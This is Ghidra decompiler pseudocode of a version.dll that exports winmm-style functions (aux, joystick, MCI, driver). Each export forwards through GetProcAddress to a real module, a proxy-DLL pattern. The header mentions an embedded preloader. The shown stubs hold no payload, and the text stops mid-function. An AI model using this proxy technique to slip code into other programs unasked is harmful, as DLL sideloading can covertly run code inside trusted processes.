/* REA / Ghidra 12.1.4 static decompilation of version.dll
SHA-256: 07f4da9e7cd87421cabcf6b3bbb5083760e5eae33b357ef2b019216677b3c543
198/198 local functions; external imports excluded.
DECOMPILER PSEUDOCODE, NOT ORIGINAL C++ SOURCE. Not directly compilable.
Embedded preloader PE is data in this outer Program and is NOT covered as native functions.
*/

/* 0x180001000 auxGetDevCapsA; Evidence ev_dcf8e03b22dcd469585b9a641efc6ac979f944c282014e985ad5338040bb790f */

MMRESULT __stdcall auxGetDevCapsA(UINT_PTR uDeviceID,LPAUXCAPSA pac,UINT cbac)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x1000  30  auxGetDevCapsA */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"auxGetDevCapsA");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180001048. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(uDeviceID,pac,CONCAT44(in_register_00000084,cbac));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180001057 auxGetDevCapsW; Evidence ev_64e01628f39c4e18bb92d39a3e9cd191baba264098d40ae7f721e2feadb2e815 */

MMRESULT __stdcall auxGetDevCapsW(UINT_PTR uDeviceID,LPAUXCAPSW pac,UINT cbac)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x1057  31  auxGetDevCapsW */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"auxGetDevCapsW");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x00018000109f. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(uDeviceID,pac,CONCAT44(in_register_00000084,cbac));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x1800010ae auxGetNumDevs; Evidence ev_703675b739412fb8ef346b8dcc85834128093130dcba96d88584ca021e062dc4 */

UINT __stdcall auxGetNumDevs(void)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x10ae  32  auxGetNumDevs */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"auxGetNumDevs");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800010f6. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)();
      return (UINT)IVar1;
    }
  }
  return 0;
}



/* 0x180001105 auxGetVolume; Evidence ev_6e49fc2a02596a721566c6c1cce93f5983b0dd11ffe741549fb1e7efc4b516c9 */

MMRESULT __stdcall auxGetVolume(UINT uDeviceID,LPDWORD pdwVolume)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_0000000c;
  
                    /* 0x1105  33  auxGetVolume */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"auxGetVolume");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x00018000114d. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(CONCAT44(in_register_0000000c,uDeviceID),pdwVolume);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x18000115c auxOutMessage; Evidence ev_3b32389bed11b4d304d27fe6b4628e682ed26285f7f12f1bd23ba26ee17c9086 */

MMRESULT __stdcall auxOutMessage(UINT uDeviceID,UINT uMsg,DWORD_PTR dw1,DWORD_PTR dw2)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_0000000c;
  undefined4 in_register_00000014;
  
                    /* 0x115c  34  auxOutMessage */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"auxOutMessage");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800011a4. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (CONCAT44(in_register_0000000c,uDeviceID),
                         CONCAT44(in_register_00000014,uMsg),dw1,dw2);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x1800011b3 auxSetVolume; Evidence ev_984dd3a7fde48eb2d474392223786b9e8e64bc3dd3caf88573e1a0af3c47fb9f */

MMRESULT __stdcall auxSetVolume(UINT uDeviceID,DWORD dwVolume)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_0000000c;
  undefined4 in_register_00000014;
  
                    /* 0x11b3  35  auxSetVolume */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"auxSetVolume");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800011fb. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (CONCAT44(in_register_0000000c,uDeviceID),
                         CONCAT44(in_register_00000014,dwVolume));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x18000120a CloseDriver; Evidence ev_8870a96b088136300aac336461eb8383bf40c81f9742d9b20f151cd76bb495e7 */

LRESULT __stdcall CloseDriver(HDRVR hDriver,LPARAM lParam1,LPARAM lParam2)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x120a  1  CloseDriver */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"CloseDriver");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180001252. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hDriver,lParam1,lParam2);
      return IVar1;
    }
  }
  return 0;
}



/* 0x180001261 DefDriverProc; Evidence ev_e2afc2235eb28d2018d16247b939f7feefa34b3dafd97f15fe3c49d7db36684c */

LRESULT __stdcall
DefDriverProc(DWORD_PTR dwDriverIdentifier,HDRVR hdrvr,UINT uMsg,LPARAM lParam1,LPARAM lParam2)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x1261  2  DefDriverProc */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"DefDriverProc");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800012a9. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (dwDriverIdentifier,hdrvr,CONCAT44(in_register_00000084,uMsg),lParam1);
      return IVar1;
    }
  }
  return 0;
}



/* 0x1800012b8 DriverCallback; Evidence ev_8e9b96a763b0575263306fdaf672a9bf52cfad7cd06275c6f33d3242158793c4 */

INT_PTR DriverCallback(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x12b8  4  DriverCallback */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"DriverCallback");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180001300. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(param_1,param_2,param_3,param_4);
      return IVar1;
    }
  }
  return 0;
}



/* 0x18000130f DrvGetModuleHandle; Evidence ev_fe52a1160f76e01319c9005e83ab6db7bedeea88f9f3c1dfc856e6b96af27200 */

HMODULE __stdcall DrvGetModuleHandle(HDRVR hDriver)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  HMODULE pHVar1;
  
                    /* 0x130f  5  DrvGetModuleHandle */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"DrvGetModuleHandle");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180001357. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      pHVar1 = (HMODULE)(*UNRECOVERED_JUMPTABLE)(hDriver);
      return pHVar1;
    }
  }
  return (HMODULE)0x0;
}



/* 0x180001366 GetDriverModuleHandle; Evidence ev_67acdaa0a44e12d6c8d7a58417ed99189a5f57852f8d41fd36505801073895bd */

HMODULE __stdcall GetDriverModuleHandle(HDRVR hDriver)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  HMODULE pHVar1;
  
                    /* 0x1366  6  GetDriverModuleHandle */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"GetDriverModuleHandle");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800013ae. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      pHVar1 = (HMODULE)(*UNRECOVERED_JUMPTABLE)(hDriver);
      return pHVar1;
    }
  }
  return (HMODULE)0x0;
}



/* 0x1800013bd joyConfigChanged; Evidence ev_e0dafc3b632f0a3081d9a9db1071bd61d811a387fca2411b964abe707ace5c9d */

INT_PTR joyConfigChanged(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4
                        )

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x13bd  36  joyConfigChanged */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"joyConfigChanged");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180001405. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(param_1,param_2,param_3,param_4);
      return IVar1;
    }
  }
  return 0;
}



/* 0x180001414 joyGetDevCapsA; Evidence ev_bbb7dd201c8dc2571b6a36a44ab6bee4ae8ae28a44ad076dbbf8fd16fc4b5b29 */

MMRESULT __stdcall joyGetDevCapsA(UINT_PTR uJoyID,LPJOYCAPSA pjc,UINT cbjc)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x1414  37  joyGetDevCapsA */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"joyGetDevCapsA");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x00018000145c. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(uJoyID,pjc,CONCAT44(in_register_00000084,cbjc));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x18000146b joyGetDevCapsW; Evidence ev_e9dbb0d166d2ff22bb7f0fa8ee628533929ca264c29968d5728d3d2e1bf2b814 */

MMRESULT __stdcall joyGetDevCapsW(UINT_PTR uJoyID,LPJOYCAPSW pjc,UINT cbjc)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x146b  38  joyGetDevCapsW */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"joyGetDevCapsW");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800014b3. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(uJoyID,pjc,CONCAT44(in_register_00000084,cbjc));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x1800014c2 joyGetNumDevs; Evidence ev_22285b661b4ce916665fd00df177189352a96a17004a278c7c34cbf7c09beb22 */

UINT __stdcall joyGetNumDevs(void)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x14c2  39  joyGetNumDevs */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"joyGetNumDevs");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x00018000150a. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)();
      return (UINT)IVar1;
    }
  }
  return 0;
}



/* 0x180001519 joyGetPos; Evidence ev_3b9a71c5762bf8edcf7e37e1ebbe9a9f530a9061fc1ae4bbdd4b54f4e772cb11 */

MMRESULT __stdcall joyGetPos(UINT uJoyID,LPJOYINFO pji)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_0000000c;
  
                    /* 0x1519  40  joyGetPos */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"joyGetPos");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180001561. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(CONCAT44(in_register_0000000c,uJoyID),pji);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180001570 joyGetPosEx; Evidence ev_4a07a3f20852aae119ad45ad1a2436ec7e1ac777ae51335774b0efac6c2539b9 */

MMRESULT __stdcall joyGetPosEx(UINT uJoyID,LPJOYINFOEX pji)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_0000000c;
  
                    /* 0x1570  41  joyGetPosEx */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"joyGetPosEx");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800015b8. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(CONCAT44(in_register_0000000c,uJoyID),pji);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x1800015c7 joyGetThreshold; Evidence ev_fff55e844e8ca4994482841d94ae64cf56659111fd5193f1bf7dbad3a02f2f22 */

MMRESULT __stdcall joyGetThreshold(UINT uJoyID,LPUINT puThreshold)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_0000000c;
  
                    /* 0x15c7  42  joyGetThreshold */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"joyGetThreshold");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x00018000160f. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(CONCAT44(in_register_0000000c,uJoyID),puThreshold);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x18000161e joyReleaseCapture; Evidence ev_2dd1be4da4550860f0d98b0dbf30df7b994c3c2633a4aa1a57ec0e72648948f2 */

MMRESULT __stdcall joyReleaseCapture(UINT uJoyID)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_0000000c;
  
                    /* 0x161e  43  joyReleaseCapture */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"joyReleaseCapture");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180001666. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(CONCAT44(in_register_0000000c,uJoyID));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180001675 joySetCapture; Evidence ev_bb49150a46334ed6e7244414ff4aa4c932cf8f0e8cda3bb7ef2dfc663a0948cb */

MMRESULT __stdcall joySetCapture(HWND hwnd,UINT uJoyID,UINT uPeriod,BOOL fChanged)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000014;
  undefined4 in_register_00000084;
  undefined4 in_register_0000008c;
  
                    /* 0x1675  44  joySetCapture */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"joySetCapture");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800016bd. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (hwnd,CONCAT44(in_register_00000014,uJoyID),
                         CONCAT44(in_register_00000084,uPeriod),
                         CONCAT44(in_register_0000008c,fChanged));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x1800016cc joySetThreshold; Evidence ev_6fd567b59e5d578ef646735a19b33a71f3240d38d7e9eb97abdf046a1c42abc5 */

MMRESULT __stdcall joySetThreshold(UINT uJoyID,UINT uThreshold)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_0000000c;
  undefined4 in_register_00000014;
  
                    /* 0x16cc  45  joySetThreshold */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"joySetThreshold");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180001714. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (CONCAT44(in_register_0000000c,uJoyID),
                         CONCAT44(in_register_00000014,uThreshold));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180001723 mciDriverNotify; Evidence ev_3e1c6faf3b3a59be65b8c6b27f2eca3b6d5911ae77fa92ee2eba961fec76263e */

INT_PTR mciDriverNotify(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x1723  46  mciDriverNotify */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mciDriverNotify");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x00018000176b. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(param_1,param_2,param_3,param_4);
      return IVar1;
    }
  }
  return 0;
}



/* 0x18000177a mciDriverYield; Evidence ev_2cf457a4d3005c21480e7ed24fb72958c60f92920e7af6081eb14492048d0f68 */

INT_PTR mciDriverYield(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x177a  47  mciDriverYield */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mciDriverYield");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800017c2. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(param_1,param_2,param_3,param_4);
      return IVar1;
    }
  }
  return 0;
}



/* 0x1800017d1 mciExecute; Evidence ev_803122c0434db472dff29054ba556f2e51446fd0555bc1bb27293c770482cb73 */

INT_PTR mciExecute(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x17d1  48  mciExecute */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mciExecute");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180001819. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(param_1,param_2,param_3,param_4);
      return IVar1;
    }
  }
  return 0;
}



/* 0x180001828 mciFreeCommandResource; Evidence ev_1425525678d7edd0d6601bb3bffbaa7d52b26523bf701e9cecf13e23a472fd0b */

INT_PTR mciFreeCommandResource
                  (undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x1828  49  mciFreeCommandResource */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mciFreeCommandResource");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180001870. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(param_1,param_2,param_3,param_4);
      return IVar1;
    }
  }
  return 0;
}



/* 0x18000187f mciGetCreatorTask; Evidence ev_50532e83978462c1a8cc701f4f684adc3fd41e601afc0ad52ca901260df3538d */

HTASK __stdcall mciGetCreatorTask(MCIDEVICEID mciId)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  HTASK pHVar1;
  undefined4 in_register_0000000c;
  
                    /* 0x187f  50  mciGetCreatorTask */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mciGetCreatorTask");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800018c7. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      pHVar1 = (HTASK)(*UNRECOVERED_JUMPTABLE)(CONCAT44(in_register_0000000c,mciId));
      return pHVar1;
    }
  }
  return (HTASK)0x0;
}



/* 0x1800018d6 mciGetDeviceIDA; Evidence ev_6920fa089278f49d1762815df36e0178ae614111e0cabc2217651bf84ebe331b */

MCIDEVICEID __stdcall mciGetDeviceIDA(LPCSTR pszDevice)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x18d6  51  mciGetDeviceIDA */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mciGetDeviceIDA");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x00018000191e. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(pszDevice);
      return (MCIDEVICEID)IVar1;
    }
  }
  return 0;
}



/* 0x18000192d mciGetDeviceIDFromElementIDA; Evidence ev_5cff4c72c69b4f3ee933bf169b34d2f0f8843eb314b53d1608fe7ced09f84c9a */

MCIDEVICEID __stdcall mciGetDeviceIDFromElementIDA(DWORD dwElementID,LPCSTR lpstrType)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_0000000c;
  
                    /* 0x192d  52  mciGetDeviceIDFromElementIDA */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mciGetDeviceIDFromElementIDA");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180001975. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(CONCAT44(in_register_0000000c,dwElementID),lpstrType);
      return (MCIDEVICEID)IVar1;
    }
  }
  return 0;
}



/* 0x180001984 mciGetDeviceIDFromElementIDW; Evidence ev_19a3ad31b1ab519149a9562fd034ff6e9803bd6864e4862431b78943e2498025 */

MCIDEVICEID __stdcall mciGetDeviceIDFromElementIDW(DWORD dwElementID,LPCWSTR lpstrType)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_0000000c;
  
                    /* 0x1984  53  mciGetDeviceIDFromElementIDW */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mciGetDeviceIDFromElementIDW");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800019cc. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(CONCAT44(in_register_0000000c,dwElementID),lpstrType);
      return (MCIDEVICEID)IVar1;
    }
  }
  return 0;
}



/* 0x1800019db mciGetDeviceIDW; Evidence ev_abb7e499a8ea64e87bc5f4d8d10034d4f21da9453f11bd5a53f954f1c1eb334c */

MCIDEVICEID __stdcall mciGetDeviceIDW(LPCWSTR pszDevice)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x19db  54  mciGetDeviceIDW */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mciGetDeviceIDW");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180001a23. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(pszDevice);
      return (MCIDEVICEID)IVar1;
    }
  }
  return 0;
}



/* 0x180001a32 mciGetDriverData; Evidence ev_e5b0ffdf639c7fa7c3ff4daec57821bfed01c68b0e3fa78ad2f2cda01db32c1f */

INT_PTR mciGetDriverData(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4
                        )

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x1a32  55  mciGetDriverData */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mciGetDriverData");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180001a7a. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(param_1,param_2,param_3,param_4);
      return IVar1;
    }
  }
  return 0;
}



/* 0x180001a89 mciGetErrorStringA; Evidence ev_b9a1cdc97d680615cbb6122cb740d86786d36a9a9022d4f02373181862c5c6c5 */

BOOL __stdcall mciGetErrorStringA(MCIERROR mcierr,LPSTR pszText,UINT cchText)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_0000000c;
  undefined4 in_register_00000084;
  
                    /* 0x1a89  56  mciGetErrorStringA */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mciGetErrorStringA");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180001ad1. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (CONCAT44(in_register_0000000c,mcierr),pszText,
                         CONCAT44(in_register_00000084,cchText));
      return (BOOL)IVar1;
    }
  }
  return 0;
}



/* 0x180001ae0 mciGetErrorStringW; Evidence ev_5057cf5d772f93140a567020c57e85b6c6493a40f5dd72f83a087b8d1692ec96 */

BOOL __stdcall mciGetErrorStringW(MCIERROR mcierr,LPWSTR pszText,UINT cchText)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_0000000c;
  undefined4 in_register_00000084;
  
                    /* 0x1ae0  57  mciGetErrorStringW */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"mciGetErrorStringW");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180001b28. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (CONCAT44(in_register_0000000c,mcierr),pszText,
                         CONCAT44(in_register_00000084,cchText));
      return (BOOL)IVar1;
    }
  }
  return 0;
}



/* 0x180001b37 mciGetYieldProc; Evidence ev_e67cd0c89fe089c4235684e3f112078b6134a5efcee0d8fda371a6847b9767f9 */

YIELDPROC __stdcall mciGetYieldProc(MCIDEVICEID mciId,LPDWORD pdwYieldData)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  YIELDPROC pYVar1;
  undefined4 in_register_0000000c;
  
